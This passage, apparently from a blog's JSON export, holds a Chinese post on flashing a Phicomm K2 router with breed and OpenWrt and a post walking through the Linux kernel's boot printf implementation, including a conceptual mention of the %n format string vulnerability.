href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">后门</a>,吓得我赶紧连开机都不试了就开始找各种固件.</p>\n<h2 id=\"刷刷刷\"><a href=\"#刷刷刷\" class=\"headerlink\" title=\"刷刷刷\"></a>刷刷刷</h2><p>根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行”测试”…为了安全,我决定还是刷<strong>OpenWrt</strong>.当然也有同学刷其他固件的,也不错.从<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\" target=\"_blank\" rel=\"external\">这里</a>提供的云盘链接下载的K2配置文件发现不能恢复,后来从<a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\" target=\"_blank\" rel=\"external\">这里</a>下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误…后来还是果断选择了先解决breed,而后再刷OpenWrt固件.<br><img src=\"/images/OpenWrt.png\" alt=\"OpenWrt\"></p>\n<h2 id=\"测试玩玩\"><a href=\"#测试玩玩\" class=\"headerlink\" title=\"测试玩玩\"></a>测试玩玩</h2><p>关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)<code>ssh root@IP_Address</code>即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.<br><img src=\"/images/OpenWrt_ssh.png\" alt=\"OpenWrt_ssh\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和”数据采集”,作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.</p>\n","excerpt":"","more":"<blockquote>\n<p>自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.</p>\n</blockquote>\n<p>参考资料:<br><a href=\"http://bbs.newifi.com/thread-3351-1-1.html\">http://bbs.newifi.com/thread-3351-1-1.html</a><br><a href=\"http://www.shaoit.com/feixunshuaji.html\">http://www.shaoit.com/feixunshuaji.html</a><br><a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\">http://www.qqgzs.com/archives/k2-v22-148.html</a><br><a href=\"http://www.openwrt.org.cn/bbs/thread-60-1-1.html\">http://www.openwrt.org.cn/bbs/thread-60-1-1.html</a><br><a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\">http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</a><br><a href=\"http://wiki.openwrt.org/zh-cn/doc/start\">OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start</a></p>\n<hr>\n<h2 id=\"到货\"><a href=\"#到货\" class=\"headerlink\" title=\"到货\"></a>到货</h2><p>看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\">后门</a>,吓得我赶紧连开机都不试了就开始找各种固件.</p>\n<h2 id=\"刷刷刷\"><a href=\"#刷刷刷\" class=\"headerlink\" title=\"刷刷刷\"></a>刷刷刷</h2><p>根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行”测试”…为了安全,我决定还是刷<strong>OpenWrt</strong>.当然也有同学刷其他固件的,也不错.从<a href=\"http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/\">这里</a>提供的云盘链接下载的K2配置文件发现不能恢复,后来从<a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\">这里</a>下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误…后来还是果断选择了先解决breed,而后再刷OpenWrt固件.<br><img src=\"/images/OpenWrt.png\" alt=\"OpenWrt\"></p>\n<h2 id=\"测试玩玩\"><a href=\"#测试玩玩\" class=\"headerlink\" title=\"测试玩玩\"></a>测试玩玩</h2><p>关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)<code>ssh root@IP_Address</code>即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.<br><img src=\"/images/OpenWrt_ssh.png\" alt=\"OpenWrt_ssh\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和”数据采集”,作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.</p>\n"},{"title":"一起来撸printf吧","date":"2016-09-25T12:17:43.000Z","_content":"\n> printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.\n\n参考资料:  \n[Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c](https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c)\n\n\n## printf大体\n首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下...大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.\n![printf](/images/printf.png)\n## va_系类宏\n然后我们利用sublime的插件来jump到`va_list`的定义,发现是一个char*的typedef.干脆就一起来认识一下`va_`系列的宏.\n\n`acpi_native_int`也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.`_AUPBND`和`_ADNBND`两个宏的值一样.而`_bnd`这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.`va_start(ap, A)`这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而`va_arg(ap, T)`目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.`va_end(ap)`仅仅为了保证安全而象征性地将ap指向NULL.\n![va_arg](/images/va_arg.png)\n## vsprintf\nvsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)  \n![vsprintf](/images/vsprintf.png)\n在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:\n```C\n#define ZEROPAD\t1\t\t/* pad with zero */\n#define SIGN\t2\t\t/* unsigned/signed long */\n#define PLUS\t4\t\t/* show plus */\n#define SPACE\t8\t\t/* space if plus */\n#define LEFT\t16\t\t/* left justified */\n#define SMALL\t32\t\t/* Must be 32 == 0x20 */\n#define SPECIAL\t64\t\t/* 0x */\n/* process flags */\n\t\tflags = 0;\n\t      repeat:\n\t\t++fmt;\t\t/* this also skips first '%' */\n\t\tswitch (*fmt) {\n\t\tcase '-':\n\t\t\tflags |= LEFT;\n\t\t\tgoto repeat;\n\t\tcase '+':\n\t\t\tflags |= PLUS;\n\t\t\tgoto repeat;\n\t\tcase ' ':\n\t\t\tflags |= SPACE;\n\t\t\tgoto repeat;\n\t\tcase '#':\n\t\t\tflags |= SPECIAL;\n\t\t\tgoto repeat;\n\t\tcase '0':\n\t\t\tflags |= ZEROPAD;\n\t\t\tgoto repeat;\n\t\t}\n```\n某些字段就不说了,用过printf的应该都知道的,其中的`#`作用就是方便16进制和8进制的格式化,例如`%#x`就会被默认加上`0x`,而`%#o`就会被默认加上`0`,具体可以看后面number函数实现就知道了.  \n\n----------------\n> 找工作太忙了,今天才得有空继续分析^~^(2016.10.17) \n\n--------------\n接下来就会去获得宽度字段,利用`isdigital`函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用`*`代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  \n\n```C\n/* get field width */\n\t\tfield_width = -1;\n\t\tif (isdigit(*fmt))\n\t\t\tfield_width = skip_atoi(&fmt);\n\t\telse if (*fmt == '*') {\n\t\t\t++fmt;\n\t\t\t/* it's the next argument */\n\t\t\tfield_width = va_arg(args, int);\n\t\t\tif (field_width < 0) {\n\t\t\t\tfield_width = -field_width;\n\t\t\t\tflags |= LEFT;\n\t\t\t}\n\t\t}\n```\n再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有`.`字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有`l`,`L`,`h`跟在后面的将使得`qualifier`被置为其ascll码值.\n```C\n/* get the precision */\n\t\tprecision = -1;\n\t\tif (*fmt == '.') {\n\t\t\t++fmt;\n\t\t\tif (isdigit(*fmt))\n\t\t\t\tprecision = skip_atoi(&fmt);\n\t\t\telse if (*fmt == '*') {\n\t\t\t\t++fmt;\n\t\t\t\t/* it's the next argument */\n\t\t\t\tprecision = va_arg(args, int);\n\t\t\t}\n\t\t\tif (precision < 0)\n\t\t\t\tprecision = 0;\n\t\t}\n\n\t\t/* get the conversion qualifier */\n\t\tqualifier = -1;\n\t\tif (*fmt == 'h' || *fmt == 'l' || *fmt == 'L') {\n\t\t\tqualifier = *fmt;\n\t\t\t++fmt;\n\t\t}\n```\n之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以`int`类型为地址单元取得参数的值直接强制转化为`unsigned char`类型的字符.为什么呢?详情参考我的另外一篇[文章](http://www.rutk1t0r.cn/2016/08/21/memory-align/),我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的`strnlen`函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,`if`和`while`没有加`{}`可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成`任意地址读写任意数据`的格式化字符串漏洞.\n之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是`continue`,意思是直接跳转到最外面的`for`循环进行下一个字符的匹配,而%xXdiu后面接的是`break`,表示退出`switch`,转而进行后面的`h,L,l`的长类型的处理去了.还要注意在`switch case break`的结构中,如果`case`了第一个条件,之后如果没有遇到`break`,程序的控制流程将忽略后面的`case`条件,直接执行语句部分,直到遇见结束的`break`.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.\n```C\n/* default base */\n\t\tbase = 10;\n\n\t\tswitch (*fmt) {\n\t\tcase 'c':\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (--field_width > 0)\n\t\t\t\t\t*str++ = ' ';\n\t\t\t*str++ = (unsigned char)va_arg(args, int);\n\t\t\twhile (--field_width > 0)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 's':\n\t\t\ts = va_arg(args, char *);\n\t\t\tlen = strnlen(s, precision);\n\n\t\t\tif (!(flags & LEFT))\n\t\t\t\twhile (len < field_width--)\n\t\t\t\t\t*str++ = ' ';\n\t\t\tfor (i = 0; i < len; ++i)\n\t\t\t\t*str++ = *s++;\n\t\t\twhile (len < field_width--)\n\t\t\t\t*str++ = ' ';\n\t\t\tcontinue;\n\n\t\tcase 'p':\n\t\t\tif (field_width == -1) {\n\t\t\t\tfield_width = 2 * sizeof(void *);\n\t\t\t\tflags |= ZEROPAD;\n\t\t\t}\n\t\t\tstr = number(str,\n\t\t\t\t     (unsigned long)va_arg(args, void *), 16,\n\t\t\t\t     field_width, precision, flags);\n\t\t\tcontinue;\n\n\t\tcase 'n':\n\t\t\tif (qualifier == 'l') {\n\t\t\t\tlong *ip = va_arg(args, long *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t} else {\n\t\t\t\tint *ip = va_arg(args, int *);\n\t\t\t\t*ip = (str - buf);\n\t\t\t}\n\t\t\tcontinue;\n\n\t\tcase '%':\n\t\t\t*str++ = '%';\n\t\t\tcontinue;\n\n\t\t\t/* integer number formats - set up the flags and \"break\" */\n\t\tcase 'o':\n\t\t\tbase = 8;\n\t\t\tbreak;\n\n\t\tcase 'x':\n\t\t\tflags |= SMALL;\n\t\tcase 'X':\n\t\t\tbase = 16;\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\tcase 'i':\n\t\t\tflags |= SIGN;\n\t\tcase 'u':\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\t*str++ = '%';\n\t\t\tif (*fmt)\n\t\t\t\t*str++ = *fmt;\n\t\t\telse\n\t\t\t\t--fmt;\n\t\t\tcontinue;\n\t\t}\n\t\tif (qualifier == 'l')\n\t\t\tnum = va_arg(args, unsigned long);\n\t\telse if (qualifier == 'h') {\n\t\t\tnum = (unsigned short)va_arg(args, int);\n\t\t\tif (flags & SIGN)\n\t\t\t\tnum = (short)num;\n\t\t} else if (flags & SIGN)\n\t\t\tnum = va_arg(args, int);\n\t\telse\n\t\t\tnum = va_arg(args, unsigned int);\n\t\tstr = number(str, num, base, field_width, precision, flags);\n\t}\n\t*str = '\\0';\n\treturn str - buf;\n```\n\n## number函数\n首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在`[]`里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时\"返回\"余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是`一切皆为文件`和`一切皆为表达式`.)\n```C\n#define __do_div(n, base) ({ \\\nint __res; \\\n__res = ((unsigned long) n) % (unsigned) base; \\\nn = ((unsigned long) n) / (unsigned) base; \\\n__res; })\n```\n再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.`static`类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.`char *`返回值表明能够实现链式功能,可对比`strcpy`函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个`num`是对%idp等格式化的栈参数的一个拷贝.第三个`base`顾名思义就是进制基数了.第四个`size`即为对齐宽度.第五个为精度,最后一个为标志位字段.  \n首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.`tmp[66]`我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为`long`的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32->第4位置位,使得可以很轻松地`或`运算实现大写字符->小写字符(ascll码相差32).如果`0`和`-`同时置位,gcc编译器会提示`warning: '0' flag ignored with '-' flag in gnu_printf format [-Wformat=]`,表明会忽略掉`0`的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的`&= ~`运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除`补零`标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符`c`也是用来填充的,为`0`或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据`size`和置位`sign`.之后判断16进制和8进制情况,16进制的`size`减2是由于要填充`0x`或者`0X`,8进制只需要填充`0`即可.之后就开始进制转换成字符了,并根据`locase`的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascll码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的`precision`表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果`ZEROPAD`和`LEFT`都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据`size`的剩余大小继续填充`c`,后面就根据i的情况填充了,直到满足`size`这个宽度域为0.最后返回`str`的首地址.\n```C\nstatic char *number(char *str, long num, int base, int size, int precision,\n\t\t    int type)\n{\n\t/* we are called with base 8, 10 or 16, only, thus don't need \"G...\"  */\n\tstatic const char digits[16] = \"0123456789ABCDEF\"; /* \"GHIJKLMNOPQRSTUVWXYZ\"; */\n\n\tchar tmp[66];\n\tchar c, sign, locase;\n\tint i;\n\n\t/* locase = 0 or 0x20. ORing digits or letters with 'locase'\n\t * produces same digits or (maybe lowercased) letters */\n\tlocase = (type & SMALL);\n\tif (type & LEFT)\n\t\ttype &= ~ZEROPAD;\n\tif (base < 2 || base > 16)\n\t\treturn NULL;\n\tc = (type & ZEROPAD) ? '0' : ' ';\n\tsign = 0;\n\tif (type & SIGN) {\n\t\tif (num < 0) {\n\t\t\tsign = '-';\n\t\t\tnum = -num;\n\t\t\tsize--;\n\t\t} else if (type & PLUS) {\n\t\t\tsign = '+';\n\t\t\tsize--;\n\t\t} else if (type & SPACE) {\n\t\t\tsign = ' ';\n\t\t\tsize--;\n\t\t}\n\t}\n\tif (type & SPECIAL) {\n\t\tif (base == 16)\n\t\t\tsize -= 2;\n\t\telse if (base == 8)\n\t\t\tsize--;\n\t}\n\ti = 0;\n\tif (num == 0)\n\t\ttmp[i++] = '0';\n\telse\n\t\twhile (num != 0)\n\t\t\ttmp[i++] = (digits[__do_div(num, base)] | locase);\n\tif (i > precision)\n\t\tprecision = i;\n\tsize -= precision;\n\tif (!(type & (ZEROPAD + LEFT)))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = ' ';\n\tif (sign)\n\t\t*str++ = sign;\n\tif (type & SPECIAL) {\n\t\tif (base == 8)\n\t\t\t*str++ = '0';\n\t\telse if (base == 16) {\n\t\t\t*str++ = '0';\n\t\t\t*str++ = ('X' | locase);\n\t\t}\n\t}\n\tif (!(type & LEFT))\n\t\twhile (size-- > 0)\n\t\t\t*str++ = c;\n\twhile (i < precision--)\n\t\t*str++ = '0';\n\twhile (i-- > 0)\n\t\t*str++ = tmp[i];\n\twhile (size-- > 0)\n\t\t*str++ = ' ';\n\treturn str;\n}\n```\n## puts\n至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.\n## 总结\n最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到`格式化字符串漏洞`参考看雪论坛这篇[文章](http://bbs.pediy.com/showthread.php?t=213153),如果没注册看不了的话先[戳这里吧](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458279936&idx=1&sn=2eb47265a0d170c45403d4b5d9097549&chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&scene=0#wechat_redirect)\n","source":"_posts/一起来撸printf吧.md","raw":"---\ntitle: 一起来撸printf吧\ndate: 2016-09-25 20:17:43\ncategories:\n- study\n- misc\n\ntags:\n- C/C++\n- Linux kernel\n\n---\n\n> printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂~_~),因为这里没有%f等浮点类型的匹配,简单一些.\n\n参考资料:  \n[Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c](https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c)\n\n\n## printf大体\n首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下...大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.\n![printf](/images/printf.png)\n## va_系类宏\n然后我们利用sublime的插件来jump到`va_list`的定义,发现是一个char*的typedef.干脆就一起来认识一下`va_`系列的宏.\n\n`acpi_native_int`也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.`_AUPBND`和`_ADNBND`两个宏的值一样.而`_bnd`这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.`va_start(ap, A)`这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而`va_arg(ap, T)`目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.`va_end(ap)`仅仅为了保证安全而象征性地将ap指向NULL.\n![va_arg](/images/va_arg.png)\n## vsprintf\nvsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)  \n![vsprintf](/images/vsprintf.png)\n在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:\n```C\n#define ZEROPAD\t1\t\t/* pad with zero */\n#define SIGN\t2\t\t/* unsigned/signed long */\n#define PLUS\t4\t\t/* show plus */\n#define SPACE\t8\t\t/* space if plus */\n#define LEFT\t16\t\t/* left justified */\n#define SMALL\t32\t\t/* Must be 32 == 0x20 */\n#define SPECIAL\t64\t\t/* 0x */\n/* process flags */\n\t\tflags = 0;\n\t      repeat:\n\t\t++fmt;\t\t/* this also skips first '%' */\n\t\tswitch (*fmt) {\n\t\tcase '-':\n\t\t\tflags |= LEFT;\n\t\t\tgoto repeat;\n\t\tcase '+':\n\t\t\tflags |= PLUS;\n\t\t\tgoto repeat;\n\t\tcase ' ':\n\t\t\tflags |= SPACE;\n\t\t\tgoto repeat;\n\t\tcase '#':\n\t\t\tflags |= SPECIAL;\n\t\t\tgoto repeat;\n\t\tcase '0':\n\t\t\tflags |= ZEROPAD;\n\t\t\tgoto repeat;\n\t\t}\n```\n某些字段就不说了,用过printf的应该都知道的,其中的`#`作用就是方便16进制和8进制的格式化,例如`%#x`就会被默认加上`0x`,而`%#o`就会被默认加上`0`,具体可以看后面number函数实现就知道了.  \n\n----------------\n> 找工作太忙了,今天才得有空继续分析^~^(2016.10.17) \n\n--------------\n接下来就会去获得宽度字段,利用`isdigital`函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用`*`代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  \n\n```C\n/* get field width */\n\t\tfield_width = -1;\n\t\tif (isdigit(*fmt))\n\t\t\tfield_width = skip_atoi(&fmt);\n\t\telse if (*fmt == '*') {\n\t\t\t++fmt;\n\t\t\t/* it's the next argument */\n\t\t\tfield_width = va_arg(args, int);\n\t\t\tif (field_width < 0) {\n\t\t\t\tfield_width = -field_width;\n\t\t\t\tflags |= LEFT;\n\t\t\t}\n\t\t}\n```\n再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有`.`字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有`l`,`L`,`h`跟在后面的将使得`qualifier`被置为其ascll码值.\n```C\n/* get the precision */\n\t\tprecision = -1;\n\t\tif (*fmt == '.') {\n\t\t\t++fmt;\n\t\t\tif (isdigit(*fmt))\n\t\t\t\tprecision = skip_atoi(&fmt);\n\t\t\telse if (*fmt == '*') {\n\t\t\t\t++fmt;\n\t\t\t\t/* it's the next argument */\n\t\t\t\tprecision = va_arg(args, int);\n\t\t\t}\n\t\t\tif (precision < 0)\n\t\t\t\tprecision = 0;\n\t\t}\n\n\t\t/* get the conversion qualifier */\n\t\tqualifier = -1;\n\t\tif (*fmt == 'h' || *fmt == 'l' || *fmt == 'L') {\n\t\t\tqualifier = *fmt;\n\t\t\t++fmt;\n\t\t}\n```\n之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以`int`类型为地址单元取得参数的值直接强制转化为`unsigned 